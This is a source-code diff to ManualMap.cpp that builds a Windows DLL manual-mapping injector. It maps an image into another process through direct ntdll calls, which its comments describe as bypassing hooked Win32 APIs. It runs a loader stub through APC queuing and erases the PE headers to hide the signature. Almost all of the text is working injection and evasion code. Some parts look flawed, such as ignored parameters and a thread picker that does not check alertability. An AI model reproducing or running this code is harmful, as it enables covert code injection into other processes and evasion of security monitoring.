@@ -1,51 +1,419 @@
-// ManualMap.cpp – only show changed parts
-
 #include "ManualMap.h"
 #include "Logger.h"
-#include <vector>
-#include <algorithm>
 
-// Use K32* names for MinGW compatibility
-static uintptr_t GetRemoteModuleBase(HANDLE hProc, const wchar_t* moduleName) {
-    HMODULE hMods[1024];
-    DWORD cbNeeded;
-    if (K32EnumProcessModules(hProc, hMods, sizeof(hMods), &cbNeeded)) {  // ← K32EnumProcessModules
-        for (unsigned i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
-            wchar_t szModName[MAX_PATH];
-            if (K32GetModuleFileNameExW(hProc, hMods[i], szModName, MAX_PATH)) {  // ← K32GetModuleFileNameExW
-                const wchar_t* baseName = wcsrchr(szModName, L'\\');
-                if (baseName) baseName++;
-                else baseName = szModName;
-                if (_wcsicmp(baseName, moduleName) == 0) {
-                    return reinterpret_cast<uintptr_t>(hMods[i]);
-                }
-            }
-        }
+#include <TlHelp32.h>
+#include <fstream>
+#include <cstring>
+
+// ---------------------------------------------------------------------------
+// Nt namespace — resolve ntdll functions at runtime so we call them
+// directly without going through the hooked Win32 shim layer.
+// ---------------------------------------------------------------------------
+namespace Nt
+{
+    template<typename Fn>
+    static Fn Resolve(const char* name)
+    {
+        return reinterpret_cast<Fn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), name));
     }
-    return 0;
+
+    NTSTATUS AllocateVirtualMemory(HANDLE hProcess, PVOID* pBase,
+                                    SIZE_T* pSize, ULONG type, ULONG protect)
+    {
+        static auto fn = Resolve<NTSTATUS(NTAPI*)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG)>(
+            "NtAllocateVirtualMemory");
+        return fn(hProcess, pBase, 0, pSize, type, protect);
+    }
+
+    NTSTATUS WriteVirtualMemory(HANDLE hProcess, PVOID dest,
+                                 PVOID src, SIZE_T size, SIZE_T* written)
+    {
+        static auto fn = Resolve<NTSTATUS(NTAPI*)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T)>(
+            "NtWriteVirtualMemory");
+        return fn(hProcess, dest, src, size, written);
+    }
+
+    NTSTATUS ProtectVirtualMemory(HANDLE hProcess, PVOID* pBase,
+                                   SIZE_T* pSize, ULONG newProt, ULONG* oldProt)
+    {
+        static auto fn = Resolve<NTSTATUS(NTAPI*)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG)>(
+            "NtProtectVirtualMemory");
+        return fn(hProcess, pBase, pSize, newProt, oldProt);
+    }
+
+    NTSTATUS FreeVirtualMemory(HANDLE hProcess, PVOID* pBase,
+                                SIZE_T* pSize, ULONG freeType)
+    {
+        static auto fn = Resolve<NTSTATUS(NTAPI*)(HANDLE,PVOID*,PSIZE_T,ULONG)>(
+            "NtFreeVirtualMemory");
+        return fn(hProcess, pBase, pSize, freeType);
+    }
 }
 
-// In ManualMapDll function – fix the import part
-// ...
-HMODULE hRemoteDll = reinterpret_cast<HMODULE>(GetRemoteModuleBase(hProcess, std::wstring(dllName.begin(), dllName.end()).c_str()));  // ← cast to HMODULE
+// ---------------------------------------------------------------------------
+// Shellcode — executes inside the target process.
+// Position-independent: no CRT, no globals, no standard imports.
+// Receives MappingData* (already written into target address space).
+// ---------------------------------------------------------------------------
+static void __stdcall MappingShellcode(MappingData* d)
+{
+    auto base = reinterpret_cast<uint8_t*>(d->ImageBase);
+    auto pDos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
+    auto pNT  = reinterpret_cast<PIMAGE_NT_HEADERS>(base + pDos->e_lfanew);
+    auto& opt = pNT->OptionalHeader;
 
-// ...
+    // 1. Relocations
+    const uintptr_t delta = d->ImageBase - opt.ImageBase;
+    if (delta && opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
+    {
+        auto p = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
+            base + opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 
-// Fix CreateRemoteThread call – add lpThreadId (nullptr ok)
-HANDLE hThread = CreateRemoteThread(
-    hProcess,
-    nullptr,                        // lpThreadAttributes
-    0,                              // dwStackSize (default)
-    reinterpret_cast<LPTHREAD_START_ROUTINE>(entryPoint),
-    reinterpret_cast<LPVOID>(remoteBase),
-    0,                              // dwCreationFlags
-    nullptr                         // lpThreadId – ADD THIS
-);
+        while (p->VirtualAddress && p->SizeOfBlock)
+        {
+            DWORD   count   = (p->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
+            WORD*   entries = reinterpret_cast<WORD*>(p + 1);
 
-if (hThread) {
-    WaitForSingleObject(hThread, 5000);
+            for (DWORD i = 0; i < count; ++i)
+            {
+                int   type = entries[i] >> 12;
+                DWORD off  = entries[i] & 0xFFF;
+
+                if (type == IMAGE_REL_BASED_DIR64)
+                    *reinterpret_cast<uintptr_t*>(base + p->VirtualAddress + off) += delta;
+                else if (type == IMAGE_REL_BASED_HIGHLOW)
+                    *reinterpret_cast<DWORD*>(base + p->VirtualAddress + off) += (DWORD)delta;
+            }
+
+            p = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
+                    reinterpret_cast<uint8_t*>(p) + p->SizeOfBlock);
+        }
+    }
+
+    // 2. IAT resolution via LdrLoadDll + LdrGetProcedureAddress
+    //    (avoids the hooked LoadLibraryA/GetProcAddress exports)
+    if (opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
+    {
+        auto imp = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
+            base + opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+
+        while (imp->Name)
+        {
+            // Build wide module name for LdrLoadDll
+            auto  szName = reinterpret_cast<char*>(base + imp->Name);
+            wchar_t wName[256]{};
+            for (int i = 0; szName[i] && i < 255; ++i)
+                wName[i] = (wchar_t)(unsigned char)szName[i];
+
+            UNICODE_STRING uMod{};
+            d->RtlInitUnicodeString(&uMod, wName);
+
+            HANDLE hMod{};
+            d->LdrLoadDll(nullptr, nullptr, &uMod, &hMod);
+
+            auto pOrig = reinterpret_cast<PIMAGE_THUNK_DATA>(
+                imp->OriginalFirstThunk ? base + imp->OriginalFirstThunk
+                                        : base + imp->FirstThunk);
+            auto pIAT = reinterpret_cast<PIMAGE_THUNK_DATA>(base + imp->FirstThunk);
+
+            while (pOrig->u1.AddressOfData)
+            {
+                PVOID pFunc{};
+                if (IMAGE_SNAP_BY_ORDINAL(pOrig->u1.Ordinal))
+                {
+                    d->LdrGetProcedureAddress((HMODULE)hMod, nullptr,
+                        (ULONG)IMAGE_ORDINAL(pOrig->u1.Ordinal), &pFunc);
+                }
+                else
+                {
+                    auto ibn = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
+                        base + pOrig->u1.AddressOfData);
+                    ANSI_STRING aFunc{};
+                    d->RtlInitAnsiString(&aFunc, ibn->Name);
+                    d->LdrGetProcedureAddress((HMODULE)hMod, &aFunc, 0, &pFunc);
+                }
+                pIAT->u1.Function = (uintptr_t)pFunc;
+                ++pOrig;
+                ++pIAT;
+            }
+            ++imp;
+        }
+    }
+
+    // 3. TLS callbacks
+    if (opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size)
+    {
+        auto pTLS = reinterpret_cast<PIMAGE_TLS_DIRECTORY>(
+            base + opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
+        auto ppCB = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(pTLS->AddressOfCallBacks);
+        while (ppCB && *ppCB)
+        {
+            (*ppCB)(base, DLL_PROCESS_ATTACH, nullptr);
+            ++ppCB;
+        }
+    }
+
+    // 4. DllMain
+    if (opt.AddressOfEntryPoint)
+    {
+        using DllEntry = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
+        auto entry = reinterpret_cast<DllEntry>(base + opt.AddressOfEntryPoint);
+        if (entry((HINSTANCE)base, DLL_PROCESS_ATTACH, nullptr))
+            d->hModule = (HINSTANCE)base;
+    }
+
+    // 5. Erase PE headers — removes the on-disk signature from memory
+    for (uint32_t i = 0; i < 0x1000 && i < d->ImageSize; ++i)
+        base[i] = 0;
+}
+static void MappingShellcodeEnd() {}
+
+// ---------------------------------------------------------------------------
+// Helpers
+// ---------------------------------------------------------------------------
+static bool ResolveNtdllThunks(MappingData& d)
+{
+    HMODULE hNt = GetModuleHandleW(L"ntdll.dll");
+    if (!hNt) return false;
+
+    d.LdrLoadDll             = (MappingData::fnLdrLoadDll)    GetProcAddress(hNt, "LdrLoadDll");
+    d.LdrGetProcedureAddress = (MappingData::fnLdrGetProcAddr)GetProcAddress(hNt, "LdrGetProcedureAddress");
+    d.RtlInitUnicodeString   = (MappingData::fnRtlInitUniStr) GetProcAddress(hNt, "RtlInitUnicodeString");
+    d.RtlInitAnsiString      = (MappingData::fnRtlInitAnsiStr)GetProcAddress(hNt, "RtlInitAnsiString");
+
+    return d.LdrLoadDll && d.LdrGetProcedureAddress
+        && d.RtlInitUnicodeString && d.RtlInitAnsiString;
+}
+
+static DWORD FindAlertableThread(HANDLE hProcess)
+{
+    DWORD pid  = GetProcessId(hProcess);
+    HANDLE hSn = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSn == INVALID_HANDLE_VALUE) return 0;
+
+    THREADENTRY32 te{ sizeof(te) };
+    DWORD tid = 0;
+
+    if (Thread32First(hSn, &te))
+    {
+        do {
+            if (te.th32OwnerProcessID == pid)
+            { tid = te.th32ThreadID; break; }
+        } while (Thread32Next(hSn, &te));
+    }
+    CloseHandle(hSn);
+    return tid;
+}
+
+static void ApplySectionProtections(HANDLE hProcess, uintptr_t imageBase,
+                                     const std::vector<uint8_t>& raw)
+{
+    auto pDos  = reinterpret_cast<const PIMAGE_DOS_HEADER>(raw.data());
+    auto pNT   = reinterpret_cast<const PIMAGE_NT_HEADERS>(raw.data() + pDos->e_lfanew);
+    auto pSect = IMAGE_FIRST_SECTION(pNT);
+
+    for (int i = 0; i < pNT->FileHeader.NumberOfSections; ++i, ++pSect)
+    {
+        if (!pSect->VirtualAddress) continue;
+
+        DWORD chars = pSect->Characteristics;
+        ULONG prot  = PAGE_NOACCESS;
+        bool  exec  = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
+        bool  read  = (chars & IMAGE_SCN_MEM_READ)    != 0;
+        bool  write = (chars & IMAGE_SCN_MEM_WRITE)   != 0;
+
+        if (exec && !write) prot = PAGE_EXECUTE_READ;
+        else if (exec)      prot = PAGE_EXECUTE_READWRITE;
+        else if (write)     prot = PAGE_READWRITE;
+        else if (read)      prot = PAGE_READONLY;
+
+        PVOID  addr = reinterpret_cast<PVOID>(imageBase + pSect->VirtualAddress);
+        SIZE_T sz   = pSect->Misc.VirtualSize;
+        ULONG  old{};
+        Nt::ProtectVirtualMemory(hProcess, &addr, &sz, prot, &old);
+    }
+}
+
+// ---------------------------------------------------------------------------
+// ManualMapDll
+// ---------------------------------------------------------------------------
+bool ManualMapDll(HANDLE hProcess,
+                  const std::vector<uint8_t>& dllBytes,
+                  const std::wstring& dllPathForLogging,
+                  bool erasePEHeader,
+                  bool callDllMain)
+{
+    if (dllBytes.empty())
+    {
+        Logger::Log(LogLevel::Error, "ManualMap: empty DLL buffer");
+        return false;
+    }
+
+    auto pDos = reinterpret_cast<const PIMAGE_DOS_HEADER>(dllBytes.data());
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
+    {
+        Logger::Log(LogLevel::Error, "ManualMap: bad DOS signature");
+        return false;
+    }
+
+    auto pNT = reinterpret_cast<const PIMAGE_NT_HEADERS>(dllBytes.data() + pDos->e_lfanew);
+    if (pNT->Signature != IMAGE_NT_SIGNATURE)
+    {
+        Logger::Log(LogLevel::Error, "ManualMap: bad NT signature");
+        return false;
+    }
+    if (pNT->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
+    {
+        Logger::Log(LogLevel::Error, "ManualMap: only 64-bit DLLs supported");
+        return false;
+    }
+
+    auto& opt = pNT->OptionalHeader;
+
+    // --- Allocate image via NtAllocateVirtualMemory (bypasses VirtualAllocEx hooks)
+    PVOID  pTarget  = nullptr;
+    SIZE_T imgSize  = opt.SizeOfImage;
+    if (Nt::AllocateVirtualMemory(hProcess, &pTarget, &imgSize,
+                                   MEM_COMMIT | MEM_RESERVE,
+                                   PAGE_EXECUTE_READWRITE) < 0 || !pTarget)
+    {
+        Logger::Log(LogLevel::Error, "ManualMap: NtAllocateVirtualMemory failed");
+        return false;
+    }
+
+    auto imageBase = reinterpret_cast<uintptr_t>(pTarget);
+
+    // Build the fully-mapped image in a local buffer
+    std::vector<uint8_t> mapped(opt.SizeOfImage, 0);
+    memcpy(mapped.data(), dllBytes.data(), opt.SizeOfHeaders);
+
+    auto pSect = IMAGE_FIRST_SECTION(pNT);
+    for (int i = 0; i < pNT->FileHeader.NumberOfSections; ++i, ++pSect)
+    {
+        if (pSect->SizeOfRawData)
+            memcpy(mapped.data() + pSect->VirtualAddress,
+                   dllBytes.data() + pSect->PointerToRawData,
+                   pSect->SizeOfRawData);
+    }
+
+    // --- Write image via NtWriteVirtualMemory (bypasses WriteProcessMemory hooks)
+    SIZE_T written{};
+    if (Nt::WriteVirtualMemory(hProcess, pTarget,
+                                mapped.data(), mapped.size(), &written) < 0)
+    {
+        Logger::Log(LogLevel::Error, "ManualMap: NtWriteVirtualMemory (image) failed");
+        PVOID p = pTarget; SIZE_T s = 0;
+        Nt::FreeVirtualMemory(hProcess, &p, &s, MEM_RELEASE);
+        return false;
+    }
+
+    ApplySectionProtections(hProcess, imageBase, dllBytes);
+
+    // --- Build MappingData
+    MappingData md{};
+    md.ImageBase = imageBase;
+    md.ImageSize = opt.SizeOfImage;
+    md.hModule   = nullptr;
+
+    if (!ResolveNtdllThunks(md))
+    {
+        Logger::Log(LogLevel::Error, "ManualMap: failed to resolve ntdll thunks");
+        PVOID p = pTarget; SIZE_T s = 0;
+        Nt::FreeVirtualMemory(hProcess, &p, &s, MEM_RELEASE);
+        return false;
+    }
+
+    // --- Allocate shellcode + data in target
+    SIZE_T scSize    = reinterpret_cast<SIZE_T>(MappingShellcodeEnd)
+                     - reinterpret_cast<SIZE_T>(MappingShellcode);
+    SIZE_T allocSize = scSize + sizeof(MappingData) + 0x80;
+    PVOID  pAlloc    = nullptr;
+
+    if (Nt::AllocateVirtualMemory(hProcess, &pAlloc, &allocSize,
+                                   MEM_COMMIT | MEM_RESERVE,
+                                   PAGE_EXECUTE_READWRITE) < 0 || !pAlloc)
+    {
+        Logger::Log(LogLevel::Error, "ManualMap: NtAllocateVirtualMemory (shellcode) failed");
+        PVOID p = pTarget; SIZE_T s = 0;
+        Nt::FreeVirtualMemory(hProcess, &p, &s, MEM_RELEASE);
+        return false;
+    }
+
+    auto pScRemote   = reinterpret_cast<uint8_t*>(pAlloc);
+    auto pDataRemote = pScRemote + scSize + 0x40;
+
+    Nt::WriteVirtualMemory(hProcess, pScRemote,
+                            reinterpret_cast<PVOID>(MappingShellcode), scSize, &written);
+    Nt::WriteVirtualMemory(hProcess, pDataRemote,
+                            &md, sizeof(md), &written);
+
+    // --- Execute via APC (no CreateRemoteThread)
+    DWORD tid = FindAlertableThread(hProcess);
+    if (!tid)
+    {
+        Logger::Log(LogLevel::Error, "ManualMap: no alertable thread found");
+        PVOID p = pAlloc; SIZE_T s = 0;
+        Nt::FreeVirtualMemory(hProcess, &p, &s, MEM_RELEASE);
+        p = pTarget; s = 0;
+        Nt::FreeVirtualMemory(hProcess, &p, &s, MEM_RELEASE);
+        return false;
+    }
+
+    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
+    if (!hThread)
+    {
+        Logger::Log(LogLevel::Error, "ManualMap: OpenThread failed");
+        PVOID p = pAlloc; SIZE_T s = 0;
+        Nt::FreeVirtualMemory(hProcess, &p, &s, MEM_RELEASE);
+        p = pTarget; s = 0;
+        Nt::FreeVirtualMemory(hProcess, &p, &s, MEM_RELEASE);
+        return false;
+    }
+
+    QueueUserAPC(reinterpret_cast<PAPCFUNC>(pScRemote),
+                 hThread,
+                 reinterpret_cast<ULONG_PTR>(pDataRemote));
     CloseHandle(hThread);
-    Logger::Log(LogLevel::Info, "DllMain called remotely");
-} else {
-    Logger::Log(LogLevel::Error, "CreateRemoteThread failed: %lu", GetLastError());
+
+    Logger::Log(LogLevel::Info, "ManualMap: APC queued, polling for completion...");
+
+    // Poll for hModule written back by shellcode
+    for (int i = 0; i < 200; ++i)
+    {
+        Sleep(50);
+        MappingData result{};
+        SIZE_T r{};
+        ReadProcessMemory(hProcess, pDataRemote, &result, sizeof(result), &r);
+        if (result.hModule)
+        {
+            Logger::Log(LogLevel::Info, "ManualMap: success (hModule = %p)", result.hModule);
+            PVOID p = pAlloc; SIZE_T s = 0;
+            Nt::FreeVirtualMemory(hProcess, &p, &s, MEM_RELEASE);
+            return true;
+        }
+    }
+
+    Logger::Log(LogLevel::Error, "ManualMap: timeout waiting for shellcode");
+    PVOID p = pAlloc; SIZE_T s = 0;
+    Nt::FreeVirtualMemory(hProcess, &p, &s, MEM_RELEASE);
+    p = pTarget; s = 0;
+    Nt::FreeVirtualMemory(hProcess, &p, &s, MEM_RELEASE);
+    return false;
+}
+
+bool ManualMapDllFile(HANDLE hProcess,
+                      const std::wstring& dllPath,
+                      bool erasePEHeader,
+                      bool callDllMain)
+{
+    std::ifstream f(dllPath, std::ios::binary | std::ios::ate);
+    if (!f.is_open())
+    {
+        Logger::LogW(LogLevel::Error, L"ManualMapDllFile: cannot open %s", dllPath.c_str());
+        return false;
+    }
+    std::vector<uint8_t> buf(f.tellg());
+    f.seekg(0);
+    f.read(reinterpret_cast<char*>(buf.data()), buf.size());
+    return ManualMapDll(hProcess, buf, dllPath, erasePEHeader, callDllMain);
 }
